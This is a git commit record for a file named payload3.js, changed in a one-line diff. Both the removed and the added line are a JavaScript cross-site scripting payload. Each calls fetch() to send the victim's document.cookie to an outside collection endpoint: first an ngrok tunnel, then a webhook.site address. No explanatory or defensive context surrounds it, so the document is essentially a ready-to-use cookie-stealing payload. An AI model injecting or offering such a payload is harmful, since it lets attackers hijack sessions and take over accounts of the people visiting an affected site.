78fd5972346c0ce02793f089baed0c61d9a57c18
hackerlo2003 <105090144+hackerlo2003@users.noreply.github.com>
2023-10-05 11:32:02 +0700

    Update payload3.js

--- payload3.js
+++ payload3.js
@@ -1,1 +1,1 @@
-fetch('https://9715-2001-ee0-4b46-9e80-b59a-881d-efee-151b.ngrok-free.app/dashboard/?c=' + document.cookie)
+fetch('https://webhook.site/f1ea22f5-2578-462a-9fad-e344003d8ae6/?c=' + document.cookie)
